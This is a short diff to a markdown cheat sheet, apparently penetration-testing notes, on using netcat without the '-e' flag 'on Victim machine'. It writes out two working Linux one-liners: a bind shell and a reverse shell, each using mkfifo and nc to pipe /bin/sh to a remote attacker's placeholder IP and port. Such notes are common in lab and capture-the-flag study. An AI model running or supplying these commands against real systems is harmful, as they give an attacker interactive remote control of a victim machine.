@@ -3,10 +3,13 @@
 ## Alternative to "-e - execute " flag in nc win/linux ( to be run on Victim machine )
 
 - Creating a bind shell for linux 
+
 `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
   (It creates a pipe and then starts the nc listner/executes the command)
 
 - Creating a Reverse shell for Linux
+
 `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
 
 ### Nc using pipe for windows
